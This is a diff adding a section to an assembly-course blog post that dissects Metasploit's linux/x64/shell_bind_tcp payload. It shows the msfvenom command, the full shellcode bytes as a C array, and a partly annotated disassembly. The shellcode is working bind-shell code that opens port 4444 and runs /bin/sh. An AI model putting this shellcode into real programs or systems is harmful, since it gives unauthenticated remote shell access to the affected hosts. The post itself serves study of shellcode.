@@ -126,3 +126,81 @@ End of assembler dump.
 #### Conclusion (#1 Shellcode)
 
 Indeed, it seems as if ```/bin/ls``` is the last thing to be pushed into the stack. Furthermore, there is a great quantity of space between ```-c``` and ```/bin/ls``` itself.
+
+#### linux/x64/shell_bind_tcp (#2 Shellcode)
+
+###### Generating shellcode
+
+```term
+root@whitecr0wz:~# msfvenom -p linux/x64/shell_bind_tcp -i 0 -f c[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 86 bytes
+Final size of c file: 386 bytes
+unsigned char buf[] =
+"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
+"\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
+"\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f"
+"\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
+"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
+"\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
+root@whitecr0wz:~#
+```
+
+##### Ndisasm
+
+```term
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect2$ echo -ne "\x6A\x29\x58\x99\x6A\x02\x5F\x6A\x01\x5E\x0F\x05\x48\x97\x52\xC7\x04\x24\x02\x00\x11\x5C\x48\x89\xE6\x6A\x10\x5A\x6A\x31\x58\x0F\x05\x6A\x32\x58\x0F\x05\x48\x31\xF6\x6A\x2B\x58\x0F\x05\x48\x97\x6A\x03\x5E\x48\xFF\xCE\x6A\x21\x58\x0F\x05\x75\xF6\x6A\x3B\x58\x99\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x52\x57\x48\x89\xE6\x0F\x05" | ndisasm -u - -b 64 
+00000000  6A29              push byte +0x29                   ; Pushes syscall value 41 (value of the socket syscall) into the stack.        
+00000002  58                pop rax                           ; Pops this value into RAX.
+00000003  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
+00000004  6A02              push byte +0x2                    ; Pushes value 2 into the stack.
+00000006  5F                pop rdi                           ; Pops this value into RDI. This will grant RDI with AF_INET, satisfying the *domain* argument.
+00000007  6A01              push byte +0x1                    ; Pushes value 1 into the stack.
+00000009  5E                pop rsi                           ; Pops this value into RSI. This will grant RSI with SOCK_STREAM, satisfying the *type* argument.
+0000000A  0F05              syscall                           ; Executes the syscall.
+0000000C  4897              xchg rax,rdi
+0000000E  52                push rdx
+0000000F  C704240200115C    mov dword [rsp],0x5c110002
+00000016  4889E6            mov rsi,rsp
+00000019  6A10              push byte +0x10
+0000001B  5A                pop rdx
+0000001C  6A31              push byte +0x31
+0000001E  58                pop rax
+0000001F  0F05              syscall
+00000021  6A32              push byte +0x32
+00000023  58                pop rax
+00000024  0F05              syscall
+00000026  4831F6            xor rsi,rsi
+00000029  6A2B              push byte +0x2b
+0000002B  58                pop rax
+0000002C  0F05              syscall
+0000002E  4897              xchg rax,rdi
+00000030  6A03              push byte +0x3
+00000032  5E                pop rsi
+00000033  48FFCE            dec rsi
+00000036  6A21              push byte +0x21
+00000038  58                pop rax
+00000039  0F05              syscall
+0000003B  75F6              jnz 0x33
+0000003D  6A3B              push byte +0x3b
+0000003F  58                pop rax
+00000040  99                cdq
+00000041  48BB2F62696E2F73  mov rbx,0x68732f6e69622f
+         -6800
+0000004B  53                push rbx
+0000004C  4889E7            mov rdi,rsp
+0000004F  52                push rdx
+00000050  57                push rdi
+00000051  4889E6            mov rsi,rsp
+00000054  0F05              syscall
+```
+
+### Code
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
+courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
+
+Student ID: SLAE-27812/PA-27812
+
+You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/SLAE64).
